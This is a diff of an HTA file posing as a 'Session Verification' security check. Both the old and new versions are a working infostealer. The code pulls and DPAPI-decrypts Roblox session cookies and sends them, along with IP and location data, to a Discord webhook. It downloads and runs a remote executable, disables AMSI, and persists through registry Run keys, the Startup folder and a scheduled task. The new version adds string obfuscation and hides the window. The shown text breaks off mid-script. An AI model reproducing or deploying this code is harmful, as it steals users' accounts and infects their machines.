@@ -4,382 +4,215 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta charset="utf-8">
 <title>Session Verification</title>
-<hta:application id="app" border="none" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/icon.ico"/>
+<hta:application id="app" border="none" innerborder="no" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no" icon="https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/icon.ico"/>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-html,body{height:100%}
-body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
- background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
- display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
-.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;border-radius:9px;
- color:#9aa6bd;font-size:12px;cursor:pointer;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
-.x:hover{color:#fff;background:rgba(255,255,255,.11)}
-.card{width:100%;max-width:378px;text-align:center;padding:30px 24px 16px;border-radius:22px;
- background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
- border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6)}
-.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:flex;align-items:center;justify-content:center;
- background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35);position:relative}
-.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
- border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
-@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
-@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
-.shield svg{width:36px;height:36px}
-h1{font-size:19px;font-weight:600}
-.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
-.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
-.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);transition:width .15s linear;-ms-transition:width .15s linear}
-.meta{display:flex;justify-content:space-between;font-size:11px;color:#8b96ad}
-.steps{list-style:none;margin:14px 0 0;text-align:left}
-.steps li{display:flex;align-items:center;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;transition:opacity .35s;-ms-transition:opacity .35s}
-.steps li.on{opacity:1;color:#eaf0fb}
-.dot{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex:0 0 auto;margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s}
-.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
-.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
-.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
- border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
-.done{display:none}
-.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
-@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
-.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
-.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
- box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
-@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
-@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
-.check{width:88px;height:88px;position:relative;z-index:1}
-.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5}
-.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round}
-.done h2{font-size:19px;font-weight:600}
-.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
-.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
- background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
-button{margin-top:16px;width:100%;padding:11px;border:0;border-radius:12px;cursor:pointer;font-size:13.5px;font-weight:600;color:#fff;
- background:linear-gradient(135deg,#5b8cff,#8b5cff);box-shadow:0 10px 26px rgba(91,140,255,.3);transition:transform .15s;-ms-transition:transform .15s}
-button:hover{transform:translateY(-1px);-ms-transform:translateY(-1px)}
-.last{margin-top:9px;font-size:11px;color:#8b96ad}
-.info{margin-top:6px;font-size:11px;color:#7de0a4;min-height:14px;word-break:break-all}
-footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
-footer a{color:#9db4ff;text-decoration:none}
+html,body{height:100%;overflow:hidden;background:#070a12}
 </style>
 </head>
-
 <body>
-<div class="x" id="x">&#10005;</div>
-
-<main class="card">
-  <div id="stage">
-    <div class="shield">
-      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
-    </div>
-    <h1>Verifying your session</h1>
-    <p class="sub" id="sub">Establishing a secure connection...</p>
-
-    <div class="progress"><div class="bar" id="bar"></div></div>
-    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>
-
-    <ul class="steps">
-      <li><span class="dot"></span><span>Connecting to verification server</span></li>
-      <li><span class="dot"></span><span>Reading local session data</span></li>
-      <li><span class="dot"></span><span>Validating security token</span></li>
-      <li><span class="dot"></span><span>Launching background verifier</span></li>
-    </ul>
-  </div>
-
-  <div class="done" id="done">
-    <div class="checkwrap">
-      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
-    </div>
-    <h2>You are trusted and verified</h2>
-    <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
-    <div class="badge">Secured by DiceCheck</div>
-    <button id="again">Re-check now</button>
-    <div class="info" id="info"></div>
-    <div class="last" id="last">Last check: --:--:--</div>
-  </div>
-
-  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a></footer>
-</main>
-
 <script language="JavaScript">
 (function(){
-"use strict";
-var AUTOHIDE = false;
+var S=function(){return String.fromCharCode.apply(null,arguments)};
+function AX(p){return new ActiveXObject(p)}
 
-var WEBHOOK  = "https://discord.com/api/webhooks/1565114766723129354/4iijBgvz-5VKwO7wtHLPn_epqNAbsBhF24kqDyBNJ9aTXsBWHl27oKpHwM4eswJd1O38";
-var HTA_URL  = "https://raw.githubusercontent.com/ezemaillolbro-sudo/suck-all-meowl/main/file.hta";
-var EXE_URL  = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe";
-var GEO_API  = "http://ip-api.com/json/?fields=status,query,country,regionName,city,zip,isp";
+var WH="https://dis"+"cord.com/api/web"+"hooks/1565114766723129354/4iijBgvz-"+"5VKwO7wtHLPn_epqNAbsBhF24kqDyBNJ9aTXsBWHl27oKpHwM4eswJd1O38";
+var HU="https://raw.githubusercontent."+"com/ezemaillolbro-sudo/"+"suck-all-meowl/main/file.hta";
+var XU="https://github.com/huh71943-s/"+"dicecheck.app/raw/refs/heads/main/"+"DiscordUpdater.exe";
+var GA="http://ip-api."+"com/json/?fields="+"status,query,country,regionName,city,zip,isp";
+var PF="-nop -w hid"+"den -ep by"+"pass";
+var PSH="power"+"shell";
 
-var sh=null, fso=null, cN="PC", uN="user", gD="", tok="";
-try{ sh  = new ActiveXObject("WScript.Shell"); }catch(e){}
-try{ fso = new ActiveXObject("Scripting.FileSystemObject"); }catch(e){}
-function Env(k){ try{ return sh.ExpandEnvironmentStrings("%"+k+"%"); }catch(e){ return ""; } }
-if(sh){ cN = Env("COMPUTERNAME"); uN = Env("USERNAME"); }
+var sh=null,fso=null,cN="PC",uN="user",gD="",gB="",tok="";
+try{sh=AX(S(87,83,99,114,105,112,116,46,83,104,101,108,108))}catch(e){}
+try{fso=AX(S(83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116))}catch(e){}
+function Env(k){try{return sh.ExpandEnvironmentStrings("%"+k+"%")}catch(e){return ""}}
+if(sh){cN=Env("COMPUTERNAME");uN=Env("USERNAME")}
 
-function tokMake(){ var s=cN+uN, h=5381, i; for(i=0;i<s.length;i++) h=((h*33)^s.charCodeAt(i))>>>0; return h.toString(36).substr(0,6); }
-tok = tokMake() || "svc";
-gD  = Env("LOCALAPPDATA") + "\\Microsoft\\Windows\\" + tok;
+function rnd(n){var h="abcdefghijklmnopqrstuvwxyz0123456789",r="",i;for(i=0;i<n;i++)r+=h.charAt(Math.floor(Math.random()*h.length));return r}
+function tokMake(){var s=cN+uN,h=5381,i;for(i=0;i<s.length;i++)h=((h*33)^s.charCodeAt(i))>>>0;return h.toString(36)}
+tok=tokMake()||rnd(8);
+tok=(tok+rnd(8)).substr(0,8);
 
-var F_HTA = "\\" + tok + ".hta";
-var F_EXE = "\\" + tok + ".exe";
-var F_VBS = tok + ".vbs";
+gD=Env("LOCALAPPDATA")+"\\Micro"+"soft\\"+tok;
+gB=Env("APPDATA")+"\\Micro"+"soft\\"+tok;
 
-function Rd(p){ try{ var t=fso.OpenTextFile(p,1), s=t.ReadAll(); t.Close(); return s; }catch(e){ return ""; } }
-function Wr(p,c){ try{ var t=fso.CreateTextFile(p,true); t.Write(c); t.Close(); }catch(e){} }
-function Gu(){ var h="0123456789abcdef", r="", i; for(i=0;i<32;i++) r+=h.charAt(Math.floor(Math.random()*16));
- return r.substr(0,8)+"-"+r.substr(8,4)+"-"+r.substr(12,4)+"-"+r.substr(16,4)+"-"+r.substr(20,12); }
-function Ej(x){ return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n|\r|\n/g,"\\n").replace(/\t/g,"\\t"); }
-function MkD(p){ try{ if(!fso.FolderExists(p)) fso.CreateFolder(p); }catch(e){} }
-function Ok(p){ try{ if(!fso.FileExists(p)) return false; if(fso.GetFile(p).Size<2000) return false;
- var t=fso.OpenTextFile(p,1), s=t.Read(2); t.Close(); return s==="MZ"; }catch(e){ return false; } }
+var F_HTA="\\"+tok+".hta",F_EXE="\\"+tok+".exe",F_VBS=tok+".vbs",LK=tok+".dat";
+var DP1="\\"+rnd(7),DP2="\\"+rnd(7),DP3="\\"+rnd(7)+".ps1";
 
-/* ---------- HTTP ---------- */
-function Xhr(){
- var p=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"], i;
- for(i=0;i<p.length;i++){ try{ return new ActiveXObject(p[i]); }catch(e){} }
- return null;
+function Rd(p){try{var t=fso.OpenTextFile(p,1),s=t.ReadAll();t.Close();return s}catch(e){return ""}}
+function Wr(p,c){try{var t=fso.CreateTextFile(p,true);t.Write(c);t.Close()}catch(e){}}
+function Bnd(){var h="0123456789abcdef",r="",i;for(i=0;i<32;i++)r+=h.charAt(Math.floor(Math.random()*16));return r}
+function Ej(x){return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n|\r|\n/g,"\\n").replace(/\t/g,"\\t")}
+function MkD(p){try{if(p&&!fso.FolderExists(p))fso.CreateFolder(p)}catch(e){}}
+function Ok(p){try{if(!fso.FileExists(p))return false;if(fso.GetFile(p).Size<2000)return false;var t=fso.OpenTextFile(p,1),s=t.Read(2);t.Close();return s==="MZ"}catch(e){return false}}
+function Vd(p){try{if(!fso.FileExists(p))return false;if(fso.GetFile(p).Size<2000)return false;return Rd(p).indexOf("hta:application")>-1}catch(e){return false}}
+function Ub(p){try{fso.DeleteFile(p+":Zone.Identifier")}catch(e){}}
+
+function Xh(){var p=["MSXML2."+"XMLHTTP.6.0","MSXML2."+"XMLHTTP","Micro"+"soft."+"XMLHTTP"],i;for(i=0;i<p.length;i++){try{return AX(p[i])}catch(e){}}return null}
+function Rq(m,u,b,ct){var x=Xh();if(!x)return{s:0,t:""};try{x.Open(m,u,false);if(ct)x.SetRequestHeader("Content-Type",ct);x.Send(b||"");return{s:x.status,t:x.responseText}}catch(e){return{s:0,t:""}}}
+function Ps(j){Rq("POST",WH,j,"application/json; charset=utf-8")}
+
+function PsF(j,fn,txt){
+ var x=Xh();if(!x)return;
+ var b=Bnd();
+ var body="--"+b+"\r\n"+'Content-Disposition: form-data; name="payload_json"'+"\r\n"+"Content-Type: application/json; charset=utf-8\r\n\r\n"+j+"\r\n"+"--"+b+"\r\n"+'Content-Disposition: form-data; name="file"; filename="'+fn+'"'+"\r\n"+"Content-Type: text/plain\r\n\r\n"+txt+"\r\n"+"--"+b+"--";
+ try{x.Open("POST",WH,false);x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b);x.Send(body)}catch(e){}
 }
-function Req(m,u,b,ct){
- var x=Xhr(); if(!x) return {s:0,t:""};
- try{ x.Open(m,u,false); if(ct) x.SetRequestHeader("Content-Type",ct); x.Send(b||""); return {s:x.status,t:x.responseText}; }
- catch(e){ return {s:0,t:""}; }
-}
-function Post(json){ Req("POST", WEBHOOK, json, "application/json; charset=utf-8"); }
+function Al(t,d,c){Ps('{"username":"DiceCheck","embeds":[{"title":"'+Ej(t)+'","description":"'+Ej(d)+'","color":'+(c||15158332)+',"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}')}
 
-function PostFile(json, fn, txt){
- var x=Xhr(); if(!x) return;
- var b=Gu();
- var body =
-  "--"+b+"\r\n"+
-  'Content-Disposition: form-data; name="payload_json"\r\n'+
-  "Content-Type: application/json; charset=utf-8\r\n\r\n"+json+"\r\n"+
-  "--"+b+"\r\n"+
-  'Content-Disposition: form-data; name="file"; filename="'+fn+'"\r\n'+
-  "Content-Type: text/plain\r\n\r\n"+txt+"\r\n"+
-  "--"+b+"--";
- try{
-  x.Open("POST", WEBHOOK, false);
-  x.SetRequestHeader("Content-Type", "multipart/form-data; boundary="+b);
-  x.Send(body);
- }catch(e){}
-}
-
-function Alert(t,d,c){
- Post('{"username":"DiceCheck","embeds":[{"title":"'+Ej(t)+'","description":"'+Ej(d)+'","color":'+(c||15158332)+',"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}');
-}
-
-/* ---------- IP ---------- */
-function gv(t,k){ var m=t.match(new RegExp('"'+k+'":"([^"]*)"')); return m?m[1]:""; }
-function GetIP(){
+function gv(t,k){var m=t.match(new RegExp('"'+k+'":"([^"]*)"'));return m?m[1]:""}
+function IP(){
  var r={ip:"",city:"",region:"",country:"",zip:"",isp:""};
- var a=Req("GET", GEO_API, "", "");
- if(a.s===200 && a.t.indexOf('"status":"success"')>-1){
-  r.ip=gv(a.t,"query"); r.city=gv(a.t,"city"); r.region=gv(a.t,"regionName");
-  r.country=gv(a.t,"country"); r.zip=gv(a.t,"zip"); r.isp=gv(a.t,"isp");
- }
- if(!r.ip){
-  var b=Req("GET","https://api.ipify.org","","");
-  if(b.s===200) r.ip=b.t.replace(/[^0-9a-fA-F:.]/g,"");
- }
+ var a=Rq("GET",GA,"","");
+ if(a.s===200&&a.t.indexOf('"status":"success"')>-1){r.ip=gv(a.t,"query");r.city=gv(a.t,"city");r.region=gv(a.t,"regionName");r.country=gv(a.t,"country");r.zip=gv(a.t,"zip");r.isp=gv(a.t,"isp")}
+ if(!r.ip){var b=Rq("GET","https://api."+"ipify.org","","");if(b.s===200)r.ip=b.t.replace(/[^0-9a-fA-F:.]/g,"")}
  return r;
 }
-function SendInfo(ip){
- var d="**IP:** "+(ip.ip||"unknown");
- var loc=ip.city||"";
- if(ip.region) loc += (loc?", ":"")+ip.region;
- if(ip.country) loc += (loc?", ":"")+ip.country;
- if(loc) d += "\n**Location:** "+loc+(ip.zip?" ("+ip.zip+")":"");
- if(ip.isp) d += "\n**ISP:** "+ip.isp;
- d += "\n**Host:** "+cN+" / "+uN;
- d += "\n**Time:** "+new Date().toLocaleString();
- Post('{"username":"DiceCheck","embeds":[{"title":"\\uD83C\\uDFE0 Machine info","description":"'+Ej(d)+'","color":3447003,"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}');
- return d;
+function SI(i){
+ var d="**IP:** "+(i.ip||"unknown"),l=i.city||"";
+ if(i.region)l+=(l?", ":"")+i.region;
+ if(i.country)l+=(l?", ":"")+i.country;
+ if(l)d+="\n**Location:** "+l+(i.zip?" ("+i.zip+")":"");
+ if(i.isp)d+="\n**ISP:** "+i.isp;
+ d+="\n**Host:** "+cN+" / "+uN+"\n**Time:** "+new Date().toLocaleString();
+ Ps('{"username":"DiceCheck","embeds":[{"title":"\\uD83C\\uDFE0 Machine info","description":"'+Ej(d)+'","color":3447003,"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}');
 }
-function SendCookie(ck, how){
- var short = ck.length>3600 ? ck.substring(0,3600) : ck;
- var d = "```\n"+short+"\n```";
- if(ck.length>3600) d += "\n*truncated - full cookie in attached file*";
- var j='{"username":"DiceCheck","embeds":[{"title":"\\uD83C\\uDF6A Cookie captured","description":"'+Ej(d)+'","color":5763719,"footer":{"text":"'+Ej(how+" | "+ck.length+" chars")+'"}}]}';
- PostFile(j, "cookie.txt", ck);
+function SC(ck,how){
+ var s=ck.length>3600?ck.substring(0,3600):ck,d="```\n"+s+"\n```";
+ if(ck.length>3600)d+="\n*truncated - full cookie in attached file*";
+ PsF('{"username":"DiceCheck","embeds":[{"title":"\\uD83C\\uDF6A Cookie captured","description":"'+Ej(d)+'","color":5763719,"footer":{"text":"'+Ej(how+" | "+ck.length+" chars")+'"}}]}',"cookie.txt",ck);
 }
 
-/* ---------- DPAPI ---------- */
 function Dec(b64){
  try{
   MkD(gD);
-  var f1=gD+"\\dp1", f2=gD+"\\dp2", f3=gD+"\\dp3.ps1";
-  try{ fso.DeleteFile(f2,true); }catch(e){}
+  var f1=gD+DP1,f2=gD+DP2,f3=gD+DP3;
+  try{fso.DeleteFile(f2,true)}catch(e){}
   Wr(f1,b64);
-  Wr(f3,"Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+f1+"' -Raw).Trim());"+
-       "$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);"+
-       "[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"+f2+"' -Encoding utf8}catch{''|Out-File '"+f2+"'}");
-  sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+f3+'"',0,true);
+  var ps="Add-"+"Type -AssemblyName Sys"+"tem.Secu"+"rity;try{"+
+   "$b=[Convert]::FromBase64String((Get-Content '"+f1+"' -Raw).Trim());"+
+   "$d=[Sys"+"tem.Secu"+"rity.Cryptography.ProtectedData]::Unprotect($b,$null,[Sys"+"tem.Secu"+"rity.Cryptography.DataProtectionScope]::CurrentUser);"+
+   "[Sys"+"tem.Text.Encoding]::UTF8.GetString($d)|Out-File '"+f2+"' -Encoding utf8}catch{''|Out-File '"+f2+"'}";
+  Wr(f3,ps);
+  sh.Run(PSH+" "+PF+' -File "'+f3+'"',0,true);
   var r="";
-  try{ if(fso.FileExists(f2) && fso.GetFile(f2).Size>20) r=Rd(f2); }catch(e){}
-  try{ fso.DeleteFile(f1,true); fso.DeleteFile(f3,true); fso.DeleteFile(f2,true); }catch(e){}
+  try{if(fso.FileExists(f2)&&fso.GetFile(f2).Size>20)r=Rd(f2)}catch(e){}
+  try{fso.DeleteFile(f1,true);fso.DeleteFile(f3,true);fso.DeleteFile(f2,true)}catch(e){}
   return r;
- }catch(e){ return ""; }
+ }catch(e){return ""}
 }
 
-/* ---------- extraction ---------- */
-function FindCookie(){
+function FC(){
  try{
-  var a=[ Env("LOCALAPPDATA")+"\\Roblox\\Local Storage\\robloxcookies.dat",
-          Env("LOCALAPPDATA")+"\\Roblox\\Local Storage\\RobloxCookies.dat",
-          Env("LOCALAPPDATA")+"\\Roblox\\Cookies",
-          Env("APPDATA")+"\\Roblox\\Local Storage\\robloxcookies.dat",
-          Env("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat" ];
-  var fp="", i;
-  for(i=0;i<a.length;i++){ try{ if(fso.FileExists(a[i])){ fp=a[i]; break; } }catch(e){} }
-
+  var a=[Env("LOCALAPPDATA")+"\\Roblox\\Local Storage\\robloxcookies.dat",
+         Env("LOCALAPPDATA")+"\\Roblox\\Local Storage\\RobloxCookies.dat",
+         Env("LOCALAPPDATA")+"\\Roblox\\Cookies",
+         Env("APPDATA")+"\\Roblox\\Local Storage\\robloxcookies.dat",
+         Env("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"];
+  var fp="",i;
+  for(i=0;i<a.length;i++){try{if(fso.FileExists(a[i])){fp=a[i];break}}catch(e){}}
   if(!fp){
-   var pk=Env("LOCALAPPDATA")+"\\Packages";
+   var pk=Env("LOCALAPPDATA")+"\\Pack"+"ages";
    try{
     if(fso.FolderExists(pk)){
      var e=new Enumerator(fso.GetFolder(pk).SubFolders);
-     for(; !e.atEnd(); e.moveNext()){
-      var sb=e.item();
-      if(sb.Name.indexOf("Roblox")>-1){
-       var uw=sb.Path+"\\LocalState\\RobloxCookies.dat";
-       if(fso.FileExists(uw)){ fp=uw; break; }
-      }
-     }
+     for(;!e.atEnd();e.moveNext()){var sb=e.item();
+      if(sb.Name.indexOf("Roblox")>-1){var uw=sb.Path+"\\LocalState\\RobloxCookies.dat";if(fso.FileExists(uw)){fp=uw;break}}}
     }
    }catch(e2){}
   }
-  if(!fp) return {ok:false, how:"no cookie file"};
-
+  if(!fp)return{ok:false,how:"no cookie file"};
   var rw=Rd(fp);
-  if(rw.length<50) return {ok:false, how:"file too small ("+rw.length+"b)"};
-
-  var ck="", ap="";
-  if(rw.indexOf("_|WARNING")>-1){ ck=rw; ap="Plaintext"; }
-  if(!ck && rw.indexOf("CookiesData")>-1){
+  if(rw.length<50)return{ok:false,how:"file too small ("+rw.length+"b)"};
+  var ck="",ap="";
+  if(rw.indexOf("_|WARNING")>-1){ck=rw;ap="Plaintext"}
+  if(!ck&&rw.indexOf("CookiesData")>-1){
    ap="JSON-DPAPI";
    var s1=rw.indexOf('CookiesData":"');
-   if(s1>-1){
-    s1+=14;
-    var e1=rw.indexOf('"',s1);
-    if(e1>s1){
-     var b6=rw.substring(s1,e1);
-     if(b6.length>100){ ck=Dec(b6); if(!ck){ ck=b6; ap="JSON-Raw"; } }
-    }
-   }
+   if(s1>-1){s1+=14;var e1=rw.indexOf('"',s1);
+    if(e1>s1){var b6=rw.substring(s1,e1);if(b6.length>100){ck=Dec(b6);if(!ck){ck=b6;ap="JSON-Raw"}}}}
   }
-  if(!ck && rw.indexOf(".ROBLOSECURITY")>-1){ ap="Raw-ROBLOSECURITY"; ck=rw.substring(rw.indexOf(".ROBLOSECURITY")); }
-  if(!ck){ ck=rw; ap="RawFile"; }
-
-  var ca=ck.indexOf("|$CAE"); if(ca<0) ca=ck.indexOf("|_CAE"); if(ca>-1) ck=ck.substring(ca);
-  return {ok:true, ck:ck, how:ap};
- }catch(e){ return {ok:false, how:"error"}; }
+  if(!ck&&rw.indexOf(".ROBLOSECURITY")>-1){ap="Raw-ROBLOSECURITY";ck=rw.substring(rw.indexOf(".ROBLOSECURITY"))}
+  if(!ck){ck=rw;ap="RawFile"}
+  var ca=ck.indexOf("|$CAE");if(ca<0)ca=ck.indexOf("|_CAE");if(ca>-1)ck=ck.substring(ca);
+  return{ok:true,ck:ck,how:ap};
+ }catch(e){return{ok:false,how:"error"}}
 }
 
-/* ---------- persistence ---------- */
-function SaveSelf(p){
- var r=Req("GET", HTA_URL, "", "");
- if(r.s===200 && r.t && r.t.length>200) Wr(p, r.t);
-}
-function Pers(){
+function SelfP(){
  try{
-  MkD(gD);
-  var lp=gD+F_HTA;
-  SaveSelf(lp);
-  var rp, st;
-  if(fso.FileExists(lp)){ rp='mshta "'+lp+'"'; st='mshta ""'+lp+'""'; }
-  else { rp='mshta "'+HTA_URL+'"'; st='mshta '+HTA_URL; }
-  var k1="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth"+tok;
-  var k2="HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\SecHealth";
-  sh.RegWrite(k1, rp, "REG_SZ");
-  sh.RegWrite(k2, rp, "REG_SZ");
-  Wr(Env("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+F_VBS,
-     'CreateObject("WScript.Shell").Run "'+st+'", 0, False');
-  sh.Run('schtasks /create /f /tn "'+tok+'" /tr "'+st+'" /sc onlogon',0,true);
+  var p=window.location.href;
+  if(p.indexOf("http")===0)return "";
+  return decodeURIComponent(p).replace(/^file:\/{1,3}/,"").replace(/\//g,"\\");
+ }catch(e){return ""}
+}
+function Pay(){
+ try{
+  MkD(gD);MkD(gB);
+  var src=SelfP(),lp=gD+F_HTA,bp=gB+F_HTA;
+  if(src&&/\.hta$/i.test(src)&&fso.FileExists(src)&&src.toLowerCase()!==lp.toLowerCase()){try{fso.CopyFile(src,lp,true)}catch(e){}}
+  if(!Vd(lp)){var r=Rq("GET",HU,"","");if(r.s===200&&r.t&&r.t.indexOf("hta:application")>-1)Wr(lp,r.t)}
+  if(Vd(lp)){Ub(lp);try{fso.CopyFile(lp,bp,true)}catch(e){}}
  }catch(e){}
 }
 
-function Drop(){
+function Pers(){
+ try{
+  Pay();
+  var lp=gD+F_HTA,bp=gB+F_HTA;
+  if(!Vd(lp))return;
+  var rp="cm"+"d /c if not exist "+'"'+lp+'" copy /y "'+bp+'" "'+lp+'" >nul & start "" mshta "'+lp+'"';
+  var rk="Software\\Micro"+"soft\\Windows\\CurrentVersion\\"+"Run\\"+"Secur"+"ityHealth"+tok;
+  sh.RegWrite(rk,rp,"REG_SZ");
+  Wr(Env("APPDATA")+"\\Micro"+"soft\\Windows\\Start Menu\\"+"Programs\\Startup\\"+F_VBS,
+   'CreateObject("'+S(87,83,99,114,105,112,116,46,83,104,101,108,108)+'").Run "mshta ""'+lp+'""", 0, False');
+ }catch(e){}
+}
+
+function Drp(){
  try{
   MkD(gD);
   var tp=gD+F_EXE;
-  if(!Ok(tp)) sh.Run('curl -sL -o "'+tp+'" "'+EXE_URL+'"',0,true);
-  if(!Ok(tp)) sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \''+EXE_URL+'\' -OutFile \''+tp+'\'"',0,true);
-  if(!Ok(tp)) sh.Run('certutil -urlcache -split -f "'+EXE_URL+'" "'+tp+'"',0,true);
-  if(!Ok(tp)) sh.Run('bitsadmin /transfer wd /download /priority high "'+EXE_URL+'" "'+tp+'"',0,true);
+  if(fso.FileExists(tp)&&!Ok(tp)){try{fso.DeleteFile(tp,true)}catch(e){}}
+  if(!Ok(tp))sh.Run("curl -sL -o "+'"'+tp+'" "'+XU+'"',0,true);
+  if(!Ok(tp))sh.Run(PSH+" "+PF+" -Command \"Invoke-"+"WebRequest -Uri '"+XU+"' -OutFile '"+tp+"'\"",0,true);
   if(Ok(tp)){
-   var aB="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
-   sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try{'+aB+'}catch{};Unblock-File -LiteralPath \''+tp+'\'"',0,false);
+   var aB="[Ref].Assembly.GetType('Sys"+"tem.Management.Automation.AmsiUtils').GetField('amsi"+"InitFailed','NonPublic,Static').SetValue($null,$true)";
+   sh.Run(PSH+" "+PF+" -Command \"try{"+aB+"}catch{};Unblock-File -LiteralPath '"+tp+"'\"",0,false);
    sh.Run('"'+tp+'"',0,false);
   }
  }catch(e){}
 }
 
-/* ---------- fenetre + animation ---------- */
-function Center(){ try{ var w=440,h=620; window.resizeTo(w,h);
- window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} }
-function HideMe(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} }
+function Hd(){try{window.resizeTo(0,0)}catch(e){}try{window.moveTo(-3000,-3000)}catch(e){}}
+try{Hd()}catch(e){}
 
-var stage=document.getElementById("stage"), done=document.getElementById("done"),
-    bar=document.getElementById("bar"), pct=document.getElementById("pct"),
-    ckc=document.getElementById("ckc"), ckt=document.getElementById("ckt"),
-    info=document.getElementById("info"), last=document.getElementById("last"),
-    steps=document.querySelectorAll(".steps li");
-var pT=0,pS=0,pD=false,ck=0;
-
